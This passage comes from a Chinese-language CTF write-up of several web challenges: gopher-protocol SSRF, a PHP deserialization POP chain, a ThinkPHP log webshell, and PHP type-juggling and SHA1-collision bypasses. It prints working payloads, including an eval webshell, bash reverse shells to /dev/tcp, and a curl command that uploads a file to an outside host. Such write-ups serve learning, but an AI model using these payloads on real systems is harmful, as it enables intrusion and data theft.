36name=admin&amp;password=123456&amp;result=60</code></pre><p>进行两次url编码，然后开头加上<code>gopher://172.17.0.7:80/_</code></p><p>值得注意的是，直接两次url编码每行的末尾是<code>%250a</code>也就是只有一个换行符，改成<code>%250D%250A</code>-换行回车</p><p>payload：<code>http://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_POST%2520%252Findex.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Aname%253Dadmin%2526password%253D123456%2526result%253D60%250d%250A</code></p><h2 id="成全"><a href="#成全" class="headerlink" title="成全"></a>成全</h2><p><code>ThinkPHP v5.0.12</code><br>报错出现了<code>debug</code>界面<br><img src="https://s3.bmp.ovh/imgs/2021/11/24dded7c8682ffb6.png"></p><p>tp的默认日志文件形式为<code>/202110/11.log</code>文件夹为年加月，文件为日</p><p>对月(1-12)和天(1-31)进行交集爆破<br><img src="https://s3.bmp.ovh/imgs/2021/11/c912d29924a29513.png"><br>结果<br><img src="https://s3.bmp.ovh/imgs/2021/11/d23301543298d305.png"><br>在第一个日志中有写好的一句话</p><pre><code>&lt;?php eval($_POST[&#39;Syccccc&#39;]);phpinfo(); ?&gt;</code></pre><p>然后通过shell读取flag</p><h2 id="easyPOP"><a href="#easyPOP" class="headerlink" title="easyPOP"></a>easyPOP</h2><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">a</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token keyword">extends</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$call</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">call</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can't do this :("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">d</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$call</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$call</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">b</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token keyword">extends</span> <span class="token class-name">b</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$call</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">call</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setB</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">d</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">c</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">d</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">d</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setB</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>执行流程：</p><pre><code>class a的test=new c(),调用c的test(),c继承于b,会先调d的test(),而b中的$b被设为[$c, &quot;eval&quot;],然后就会调用c的eval()函数，而$this-&gt;call=[new d(&quot;system&quot;), &quot;eval&quot;],$this-&gt;value=[new d(&quot;whoami&quot;), &quot;eval&quot;],然后($this-&gt;call)($this-&gt;value)就变成了([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;]);第一次进入到d中，d的$this-&gt;value=system,$call=[new d(&quot;whoami&quot;), &quot;eval&quot;];$call($this-&gt;value)就成了[new d(&quot;whoami&quot;), &quot;eval&quot;] (&quot;system&quot;)第二次进入d中,d的$this-&gt;value=whoami,$call=system,$call($this-&gt;value)就成了(&quot;system&quot;)(&quot;whoami&quot;)</code></pre><p>关于为啥<code>[$c, &quot;eval&quot;]</code>就能执行<code>c</code>的<code>eval</code>函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">aa</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"123"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$dd</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">aa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fun"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//输出 123      ["aa","fun"]()这样也可以</span></code></pre><p>还有就是<code>([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;])</code>这个，后面的<code>[new d(&quot;whoami&quot;), &quot;eval&quot;]</code>被当作eval的参数传进去了</p><p>看一个简单的</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">aa</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$c1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$qq</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">c1</span><span class="token operator">=</span><span class="token variable">$qq</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">bb</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$aadd</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"34"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$aadd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">aa</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">bb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fun"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>输出</p><pre><code>34array(1) &#123;[0]=&gt;string(3) &quot;123&quot;&#125;</code></pre><p>所以在一个数组中，<code>[new a(),&quot;fff&quot;]()</code>就相当于<code>new a()-&gt;ff()</code>,当然，后面的<code>()</code>里也可以加参数，如果需要的话</p><p><code>php是世界上最好的语言✔（￣︶￣）↗　</code></p><h2 id="where-is-my-FUMO"><a href="#where-is-my-FUMO" class="headerlink" title="where_is_my_FUMO"></a>where_is_my_FUMO</h2><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">chijou_kega_no_junnka</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">">"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">";"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"|"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"&#123;"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"&#125;"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"/"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">" "</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$black_list</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'DATA'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'DATA'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token function">chijou_kega_no_junnka</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token function">chijou_kega_no_junnka</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PORT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"bash -c \"bash -i &lt; /dev/tcp/<span class="token interpolation"><span class="token variable">$addr</span></span>/<span class="token interpolation"><span class="token variable">$port</span></span>\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>反弹shell，但是是个无回显的shell,可以无回显shell中执行反弹shell命令，再次反弹到VPS的另一个端口</p><p><code>bash -i &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></p><p>flag在<code>/flag.png</code>中</p><p>可以这样<code>curl bashupload.com -T /flag.png</code> </p><p><code>bashupload.com</code>是一个用来传输服务器文件的网站</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111301202589.png"><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111301203952.png"></p><p>下载即可</p><ul><li>第二种方法<br>传到自己的服务器上<br><code>cat /flag.png &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></li></ul><p><code>nc -lvnp 2233 &gt; /var/flag.png</code></p><h2 id="Baby-PHP-Black-Magic-Enlightenment"><a href="#Baby-PHP-Black-Magic-Enlightenment" class="headerlink" title="Baby_PHP_Black_Magic_Enlightenment"></a>Baby_PHP_Black_Magic_Enlightenment</h2><p>第一关：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token double-quoted-string string">"PHP is the best Language &lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Have you ever heard about PHP Black Magic&lt;br/>"</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no way"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token operator">></span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"How's that possible"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Art is long, but life is short. So I use PHP.</span><span class="token comment">//I think It`s So useful that DiaoRen Said;</span><span class="token comment">//why not they use their vps !!!</span><span class="token comment">//BBTZ le jiarenmen</span><span class="token delimiter important">?></span></code></pre><p><code>/?password=10000a</code></p><p>第二关：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'no no no no way for you to do so.'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'G1ve u the flag'</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'not right'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Just g1ve it a try.'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>/baby_magic.php?user[]=1&amp;pass[]=2</code><br>第三关：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'fllag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'no no no no way for you to do so.'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'There is no way you can sneak me, young man!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Hanzo:It is impossible only the tribe of Shimada can controle the dragon&lt;br/>"</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Genji:We will see again Hanzo'</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;br/>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Wrong!'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Just G1ve it a try.'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>sha1哈希碰撞</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestrotimi <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://shattered.io/static/shattered-1.pdf"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span>letmein <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://shattered.io/static/shattered-2.pdf"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://tc.rigelx.top:8003/baby_revenge.php'</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'user'</span><span class="token punctuation">:</span> rotimi<span class="token punctuation">,</span> <span class="token string">'pass'</span><span class="token punctuation">:</span> letmein<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment">#来自：https://www.linkedin.com/pulse/using-sha1-collision-attack-solve-bostonkeyparty-ctf-rotimi</span></code></pre><p>或者：<br>    